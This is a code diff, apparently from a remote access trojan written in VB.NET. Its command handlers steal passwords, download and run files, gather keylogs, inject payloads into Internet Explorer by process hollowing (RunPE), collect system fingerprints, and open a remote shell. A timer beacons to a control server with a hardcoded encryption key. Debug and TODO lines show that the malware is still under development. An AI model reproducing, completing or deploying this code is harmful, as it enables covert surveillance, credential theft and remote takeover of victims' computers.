+                    '    SAPI.speak(A(1))
+                    Case n.getpasswords ''passwords
+                        C.Send(n.getpasswords & Sep & gpasswords)
+                    Case n.download ''run file after copying todo: implement
+                        My.Computer.FileSystem.WriteAllBytes(A(2), SB(A(1)), False)
+                        Process.Start(A(2))
+                        C.Send(n.download)
+                    '    Case "logf"
+                    '       C.Send("logf" & Yy & getlog(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name) & Yy & Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name)
+                    Case n.openklog ''keylogger pingback
+                        C.Send(n.openklog)
+                    Case n.getklog ''ket keylogs
+                        Try
+                            C.Send(n.getklog & Sep & o.Logs)
+                        Catch : End Try
+                    Case n.delklog
+                        o.Close(False)
+                        Dim di As New DirectoryInfo(Application.StartupPath)
+                        Dim files As FileInfo() = di.GetFiles()
+                        Dim fri As FileInfo
+                        For Each fri In files
+                            Try
+                                If fri.Name.EndsWith(klfext) Then
+                                    fri.Delete()
+                                End If
+                            Catch ex As Exception
+
+                            End Try
+                        Next fri
+                        o = New KLogger
+                        o.Start()
+                        C.Send(n.delklog)
+                    Case n.message ''show message
+                        Try
+                            RunPE.Run("C:\Program Files (x86)\Internet Explorer\iexplore.exe", "@#@" & A(1) & "@#@" & A(2), My.Resources.MessageMaker, False) ''ToDO Change path!
                         Catch ex As Exception
+                            MsgBox("RunPE fail: " & ex.Message) ''todo: remove
                         End Try
-                    Next fri
-                    o.Start()
-                    C.Send("dellog")
-                Case "msg" ''show message
-                    Dim mi As String = "e"
-                    Select Case A(2)
-                        Case 64
-                            mi = "i"
-                        Case 48
-                            mi = "w"
-                        Case 32
-                            mi = "q"
-                        Case 16
-                            mi = "e"
-                    End Select
-                    Try
-                        RunPE.Run("C:\Program Files (x86)\Internet Explorer\iexplore.exe", "@#@" & A(1) & "@#@" & mi, My.Resources.MessageMaker, False) ''ToDO Change path!
-                    Catch ex As Exception
-                        MsgBox("RunPE fail: " & ex.Message)
-                    End Try
 
-                Case "specs" ''system specs TODO!
-                    Dim sp As String = My.Computer.Info.TotalPhysicalMemory
+                    Case n.getspecs ''system specs TODO!
+                        Dim sp As String = My.Computer.Info.TotalPhysicalMemory
 
 
-                    Dim search As New ManagementObjectSearcher(New SelectQuery("Win32_Processor"))
-                    Dim search2 As New ManagementObjectSearcher(New SelectQuery("Win32_ComputerSystem"))
-                    Dim moc As ManagementObjectCollection = New ManagementClass("Win32_NetworkAdapterConfiguration").GetInstances()
+                        Dim search As New ManagementObjectSearcher(New SelectQuery("Win32_Processor"))
+                        Dim search2 As New ManagementObjectSearcher(New SelectQuery("Win32_ComputerSystem"))
+                        Dim moc As ManagementObjectCollection = New ManagementClass("Win32_NetworkAdapterConfiguration").GetInstances()
 
-                    Dim info As ManagementObject
-                    Dim info2 As ManagementObject
+                        Dim info As ManagementObject
+                        Dim info2 As ManagementObject
 
-                    For Each info In search.Get()
-                        AddTo(infostring, info("processorid").ToString())
-                        AddTo(infostring, info("name").ToString())
-                    Next
+                        For Each info In search.Get()
+                            AddTo(infostring, info("processorid").ToString())
+                            AddTo(infostring, info("name").ToString())
+                        Next
 
-                    For Each info2 In search.Get()
-                        ''AddTo(infostring, info2("model").ToString())
-                        AddTo(infostring, info2("manufacturer").ToString())
-                    Next
+                        For Each info2 In search.Get()
+                            ''AddTo(infostring, info2("model").ToString())
+                            AddTo(infostring, info2("manufacturer").ToString())
+                        Next
 
-                    Dim MACAddress As String = String.Empty
-                    For Each mo As ManagementObject In moc
-                        If (MACAddress.Equals(String.Empty)) Then
-                            If CBool(mo("IPEnabled")) Then MACAddress = mo("MacAddress").ToString()
-                            mo.Dispose()
-                        End If
-                        AddTo(infostring, MACAddress.Replace(":", String.Empty))
-                    Next
+                        Dim MACAddress As String = String.Empty
+                        For Each mo As ManagementObject In moc
+                            If (MACAddress.Equals(String.Empty)) Then
+                                If CBool(mo("IPEnabled")) Then MACAddress = mo("MacAddress").ToString()
+                                mo.Dispose()
+                            End If
+                            AddTo(infostring, MACAddress.Replace(":", String.Empty))
+                        Next
 
-                    Dim uptimeSec As Integer = Environment.TickCount / 1000
-                    Dim result As TimeSpan = TimeSpan.FromSeconds(uptimeSec)
-                    AddTo(infostring, String.Format("{0}d : {1}h : {2}m : {3}s", result.Days, result.Hours, result.Minutes, result.Seconds))
+                        Dim uptimeSec As Integer = Environment.TickCount / 1000
+                        Dim result As TimeSpan = TimeSpan.FromSeconds(uptimeSec)
+                        AddTo(infostring, String.Format("{0}d : {1}h : {2}m : {3}s", result.Days, result.Hours, result.Minutes, result.Seconds))
 
-                    C.Send("specs" & Sep & infostring)
-                ''ip lan etc
-
-                Case "reconnect"
-                    C.DisConnect()
-            End Select
+                        C.Send(n.getspecs & Sep & infostring)
+                    ''ip lan etc
+                    Case n.reconnect
+                        C.DisConnect()
+                    Case n.openshell ''new shell
+                        C.Send(n.openshell)
+                        sh = New CShell
+                        sh.createsession()
+                    Case n.putshell ''write to shell
+                        sh.execute(A(1))
+                    Case n.endshell ''kill shell
+                        sh.closesession()
+                End Select
+            End If
         Catch ex As Exception
             MsgBox(ex.Message & vbNewLine & ex.StackTrace) ''TODO: ABSOLUTELY REMOVE!
         End Try
@@ -637,8 +674,8 @@ B:
     End Sub
 
     Private Sub ForeTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs)  ''500
-        If C.Statconnected Then
-            InfoLabel.Text = "Forewindows timer inc:" & inc
+        If C.Statconnected And trust Then
+            ''InfoLabel.Text = "Forewindows timer inc:" & inc
             inc += 1
             Dim CapTxt As String = GetCaption()
             If makel <> CapTxt Then
@@ -646,13 +683,13 @@ B:
                 ' stop timer before showing msgbox so it is not detected!
                 ''^ WUT?
                 ForeTimer.Stop()
-                C.Send("AW" & Sep & CapTxt)
+                C.Send(n.activewindow & Sep & CapTxt)
                 ' resume timer
 
                 ForeTimer.Start()
             End If
         Else
-            InfoLabel.Text = "Forewindows timer bad:" & inc
+            ''InfoLabel.Text = "Forewindows timer bad:" & inc
             inc += 1
             C.DisConnect()
         End If
@@ -665,11 +702,11 @@ B:
             C.Connect(HOST, port)
         End If
     End Sub
-    Private Sub ServeTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs) ''çonnect to lavender web
+    Private Sub ServeTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs) ''connect to lavender web
         trust = False
         Dim response As String
         Try
-            response = WRequest("http://" & HOST & "/index.php", "0x1", "POST", "id=" & Crypt.AES.Encrypt(name, pw, Crypt.AES.salt, "SHA1", 1000, Crypt.AES.IV, 256) & "&iv=" & Crypt.AES.IV)
+            response = WRequest("http://" & HOST & "/index.php", "0x1", "POST", "id=" & Crypt.AES.Encrypt(name, "hinki", Crypt.AES.salt, "SHA1", 1000, Crypt.AES.IV, 256) & "&iv=" & Crypt.AES.IV)
         Catch ex As Exception
             MsgBox(ex.Message)
         End Try
@@ -698,7 +735,7 @@ B:
             End If
             Dim hwresponse As Net.HttpWebResponse = hwrequest.GetResponse()
             If hwresponse.StatusCode = Net.HttpStatusCode.OK Then
-                Dim responseStream As IO.StreamReader = _
+                Dim responseStream As IO.StreamReader =
                   New IO.StreamReader(hwresponse.GetResponseStream())
                 responseData = responseStream.ReadToEnd()
             End If
